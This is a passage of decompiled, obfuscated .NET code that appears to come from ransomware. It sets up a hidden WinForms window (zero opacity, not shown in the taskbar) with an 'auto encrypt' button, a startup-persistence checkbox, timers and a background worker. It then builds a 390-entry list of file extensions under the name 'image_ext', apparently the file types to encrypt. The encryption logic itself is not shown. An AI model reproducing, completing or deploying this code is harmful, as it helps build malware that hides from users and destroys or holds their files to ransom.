				((Control)comboBox3).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(368));
				num = 66;
				break;
			case 24:
				((Control)button8).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(364));
				num2 = 89;
				if (false)
				{
					goto case 41;
				}
				goto IL_0c25;
			case 41:
				((Form)this).set_ClientSize(new Size(664, 148));
				num3 = 108;
				goto IL_0c21;
			case 30:
				((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
				num = 83;
				break;
			case 83:
				((Control)webBrowser1).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(396));
				num = 130;
				break;
			case 94:
				((Control)this).get_Controls().Add((Control)(object)button10);
				num2 = 109;
				goto IL_0c25;
			case 29:
				btnStartAutoEncrypt = new Button();
				num2 = 44;
				if (false)
				{
					goto case 34;
				}
				goto IL_0c25;
			case 34:
				((Control)btnStartAutoEncrypt).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(348));
				num = 110;
				break;
			case 17:
				((Control)this).get_Controls().Add((Control)(object)comboBox2);
				num3 = 112;
				goto IL_0c21;
			case 11:
				((Form)this).set_Icon((Icon)componentResourceManager.GetObject(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(408)));
				num2 = 56;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 12;
				}
				goto IL_0c25;
			case 12:
				((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
				num2 = 120;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 15;
				}
				goto IL_0c25;
			case 107:
				((Control)button3).set_Size(new Size(75, 23));
				num = 19;
				break;
			case 88:
				((Control)this).get_Controls().Add((Control)(object)checkBox1);
				num = 80;
				break;
			case 67:
				((Control)this).SuspendLayout();
				num = 36;
				break;
			case 47:
				if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(80))
				{
					num2 = 111;
					if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						goto case 90;
					}
				}
				else
				{
					components = new Container();
					num2 = 64;
				}
				goto IL_0c25;
			case 18:
				((Control)button1).set_TabIndex(5);
				((Control)button1).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(392));
				((ButtonBase)button1).set_UseVisualStyleBackColor(true);
				num2 = 59;
				goto IL_0c25;
			case 82:
				timer3.add_Tick((EventHandler)timer3_Tick);
				num3 = 86;
				goto IL_0c21;
			case 93:
				((ButtonBase)button10).set_UseVisualStyleBackColor(true);
				num3 = 118;
				goto IL_0c21;
			case 71:
				((Form)this).set_StartPosition((FormStartPosition)1);
				num = 134;
				break;
			case 89:
				((ButtonBase)button8).set_UseVisualStyleBackColor(true);
				num2 = 84;
				goto IL_0c25;
			case 7:
			case 100:
				((ButtonBase)button12).set_UseVisualStyleBackColor(true);
				num2 = 51;
				if (false)
				{
					goto case 40;
				}
				goto IL_0c25;
			case 40:
				((Form)this).set_Opacity(0.0);
				num3 = 129;
				goto IL_0c21;
			case 9:
				timer4.set_Interval(105100);
				num2 = 2;
				goto IL_0c25;
			case 1:
				((ButtonBase)button11).set_UseVisualStyleBackColor(true);
				backgroundWorker1.DoWork += backgroundWorker1_DoWork;
				num2 = 104;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto IL_0c25;
				}
				goto case 49;
			case 118:
				((ListControl)comboBox1).set_FormattingEnabled(true);
				num2 = 37;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 91;
				}
				goto IL_0c25;
			case 28:
				((Control)comboBox2).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(356));
				num2 = 31;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto case 56;
				}
				goto IL_0c25;
			case 56:
				((Form)this).set_Margin(new Padding(4));
				num = 115;
				break;
			case 72:
				comboBox1 = new ComboBox();
				chckIsStartup = new CheckBox();
				num = 135;
				break;
			case 80:
				((Control)this).get_Controls().Add((Control)(object)webBrowser1);
				num3 = 17;
				goto IL_0c21;
			case 86:
				((ListControl)comboBox2).set_FormattingEnabled(true);
				num3 = 54;
				goto IL_0c21;
			case 124:
				((Control)btnStartAutoEncrypt).set_Location(new Point(539, 112));
				((Control)btnStartAutoEncrypt).set_Margin(new Padding(4));
				num3 = 34;
				goto IL_0c21;
			case 122:
				((ButtonBase)chckIsStartup).set_UseVisualStyleBackColor(true);
				num3 = 16;
				goto IL_0c21;
			case 3:
				((Control)button10).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(376));
				num3 = 93;
				goto IL_0c21;
			case 15:
				((Control)button9).set_Size(new Size(75, 23));
				num = 79;
				break;
			case 2:
				timer4.add_Tick((EventHandler)timer4_Tick);
				num = 20;
				break;
			case 92:
				((Control)this).PerformLayout();
				num3 = 136;
				goto IL_0c21;
			case 0:
				((ButtonBase)button9).set_UseVisualStyleBackColor(true);
				((Control)button10).set_Location(new Point(108, 26));
				num2 = 46;
				if (1 == 0)
				{
					goto case 81;
				}
				goto IL_0c25;
			case 81:
				((Control)checkBox1).set_Size(new Size(98, 21));
				num2 = 26;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 85;
				}
				goto IL_0c25;
			case 85:
				((Control)this).get_Controls().Add((Control)(object)chckIsStartup);
				num = 11;
				break;
			case 5:
				((Control)this).get_Controls().Add((Control)(object)button1);
				num = 63;
				break;
			case 98:
				((Control)webBrowser1).set_TabIndex(11);
				num3 = 119;
				goto IL_0c21;
			case 50:
				((Control)button1).set_Location(new Point(225, 72));
				((Control)button1).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(392));
				((Control)button1).set_Size(new Size(75, 23));
				num3 = 18;
				goto IL_0c21;
			case 38:
				((Control)btnStartAutoEncrypt).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(208));
				num3 = 78;
				goto IL_0c21;
			case 126:
				timer2 = new Timer(components);
				num2 = 35;
				goto IL_0c25;
			case 117:
				((Control)this).get_Controls().Add((Control)(object)comboBox3);
				num = 61;
				break;
			case 95:
				((Control)chckIsStartup).set_Anchor((AnchorStyles)10);
				num2 = 131;
				goto IL_0c25;
			case 105:
				((Control)btnStartAutoEncrypt).add_Click((EventHandler)btnStartAutoEncrypt_Click);
				num3 = 123;
				goto IL_0c21;
			case 73:
				((Control)chckIsStartup).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(388));
				num = 122;
				break;
			case 111:
				return;
			case 36:
				((Control)btnStartAutoEncrypt).set_Anchor((AnchorStyles)10);
				num2 = 48;
				goto IL_0c25;
			case 27:
				((Control)button11).set_Size(new Size(75, 23));
				num3 = 49;
				goto IL_0c21;
			case 129:
				((Form)this).set_ShowInTaskbar(false);
				num2 = 71;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 13;
				}
				goto IL_0c25;
			case 13:
				webBrowser1 = new WebBrowser();
				num2 = 113;
				goto IL_0c25;
			case 57:
				((Control)button9).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(372));
				num = 15;
				break;
			case 115:
				((Form)this).set_MaximizeBox(false);
				num3 = 76;
				goto IL_0c21;
			case 53:
				backgroundWorker1 = new BackgroundWorker();
				num2 = 67;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 60;
				}
				goto IL_0c25;
			case 60:
				timer2.add_Tick((EventHandler)timer2_Tick);
				num3 = 127;
				goto IL_0c21;
			case 79:
				((Control)button9).set_TabIndex(19);
				goto default;
			default:
				_ = 0;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num2 = 7;
					if (1 == 0)
					{
						goto case 114;
					}
				}
				else
				{
					num2 = 6;
				}
				goto IL_0c25;
			case 46:
				((Control)button10).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(376));
				num2 = 25;
				goto IL_0c25;
			case 125:
				((Control)button9).set_Location(new Point(207, 47));
				num2 = 57;
				goto IL_0c25;
			case 128:
				((Control)button11).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(404));
				num3 = 27;
				goto IL_0c21;
			case 123:
				timer1.add_Tick((EventHandler)timer1_Tick);
				num = 60;
				break;
			case 52:
				((Control)this).get_Controls().Add((Control)(object)button8);
				num = 117;
				break;
			case 133:
				button8 = new Button();
				num3 = 101;
				goto IL_0c21;
			case 23:
				timer4.set_Enabled(true);
				num = 9;
				break;
			case 43:
				((Control)button12).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(400));
				((Control)button12).set_Size(new Size(75, 23));
				((Control)button12).set_TabIndex(16);
				num3 = 96;
				goto IL_0c21;
			case 104:
				((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
				num = 22;
				break;
			case 22:
				((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
				num3 = 41;
				goto IL_0c21;
			case 62:
				((ButtonBase)button3).set_UseVisualStyleBackColor(true);
				num2 = 82;
				if (0 == 0)
				{
					goto IL_0c25;
				}
				goto case 130;
			case 130:
				((Control)webBrowser1).set_Size(new Size(250, 250));
				num2 = 98;
				goto IL_0c25;
			case 55:
				((Control)chckIsStartup).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(384));
				num2 = 4;
				goto IL_0c25;
			case 97:
				((Control)chckIsStartup).set_TabIndex(1);
				num = 73;
				break;
			case 58:
				((Control)checkBox1).set_Location(new Point(478, 98));
				((Control)checkBox1).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(360));
				num2 = 81;
				if (true)
				{
					goto IL_0c25;
				}
				goto case 54;
			case 54:
				((Control)comboBox2).set_Location(new Point(106, 27));
				num = 28;
				break;
			case 109:
				((Control)this).get_Controls().Add((Control)(object)button11);
				num = 21;
				break;
			case 112:
				((Control)this).get_Controls().Add((Control)(object)button3);
				num2 = 5;
				goto IL_0c25;
			case 78:
				((ButtonBase)btnStartAutoEncrypt).set_UseVisualStyleBackColor(true);
				num = 105;
				break;
			case 134:
				((Control)this).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(412));
				num2 = 70;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto case 70;
				}
				goto IL_0c25;
			case 75:
				((Control)button8).set_Location(new Point(278, 154));
				num3 = 39;
				goto IL_0c21;
			case 49:
				((Control)button11).set_TabIndex(17);
				num3 = 102;
				goto IL_0c21;
			case 132:
				((Control)comboBox1).set_TabIndex(22);
				num2 = 95;
				if (0 == 0)
				{
					goto IL_0c25;
				}
				goto case 19;
			case 19:
				((Control)button3).set_TabIndex(7);
				num = 106;
				break;
			case 21:
				((Control)this).get_Controls().Add((Control)(object)button12);
				num3 = 88;
				goto IL_0c21;
			case 16:
				((Control)chckIsStartup).add_Click((EventHandler)chckIsStartup_Click);
				num3 = 50;
				goto IL_0c21;
			case 66:
				((Control)comboBox3).set_Size(new Size(121, 24));
				num2 = 114;
				goto IL_0c25;
			case 87:
				((Control)btnStartAutoEncrypt).set_TabIndex(4);
				num3 = 38;
				goto IL_0c21;
			case 65:
				button10 = new Button();
				num2 = 72;
				goto IL_0c25;
			case 99:
				((Control)checkBox1).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(360));
				num2 = 12;
				goto IL_0c25;
			case 37:
				((Control)comboBox1).set_Location(new Point(35, 28));
				num3 = 69;
				goto IL_0c21;
			case 6:
			case 68:
				((Control)button9).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(372));
				num2 = 0;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 33;
				}
				goto IL_0c25;
			case 59:
				((Control)webBrowser1).set_Location(new Point(131, 12));
				num2 = 30;
				goto IL_0c25;
			case 102:
				((Control)button11).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(404));
				num2 = 1;
				goto IL_0c25;
			case 127:
				((Control)button3).set_Location(new Point(191, 28));
				num2 = 90;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto IL_0c25;
				}
				goto case 113;
			case 113:
				button12 = new Button();
				button11 = new Button();
				num = 32;
				break;
			case 64:
				componentResourceManager = new ComponentResourceManager(Type.GetTypeFromHandle(_0089_008E_008C_008D_0088_0090_008F_0095_008E_0088_0090_0089_0095_0093_0089_008E_008C_008B_0090_0093_008E_0091_0087_0095_0088_0095_0091_0086_008B_008B_008A_0086_0090_0094_0091_0095.e53w34m968awCm9P85taUZe(33554439)));
				num = 29;
				break;
			case 90:
				((Control)button3).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(352));
				num3 = 107;
				goto IL_0c21;
			case 136:
				return;
				IL_0c21:
				num2 = num3;
				goto IL_0c25;
				IL_0c25:
				num = num2;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	static _008C_0091_0086_0086_0086_0091_008C_0087_0094_008A_0094_008F_0094_0093_0094_0086_0090_008D_008F_0094_008A_008C_0093_008D_008E_0093_0086_0088_008E_0088_0092_008B_0087_0091_0094_008E()
	{
		//Discarded unreachable code: IL_0005, IL_1b5e
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_1b9e: Incompatible stack heights: 0 vs 1
		int num = 7;
		if (1 == 0)
		{
			goto IL_0016;
		}
		goto IL_1b67;
		IL_1b67:
		int num2 = num;
		goto IL_1b6b;
		IL_1b6b:
		while (true)
		{
			int num3;
			switch (num2)
			{
			case 0:
			case 4:
				break;
			case 7:
				if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(84))
				{
					num3 = 2;
					goto IL_1b63;
				}
				return;
			case 2:
				image_ext = new string[390]
				{
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(416),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(420),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(424),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(428),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(432),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(436),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(440),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(444),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(448),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(452),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(456),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(460),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(464),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(468),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(472),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(476),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(480),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(484),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(488),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(492),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(496),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(500),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(504),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(508),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(512),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(516),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(520),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(524),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(528),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(532),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(536),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(540),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(544),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(548),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(552),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(556),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(560),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(564),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(568),
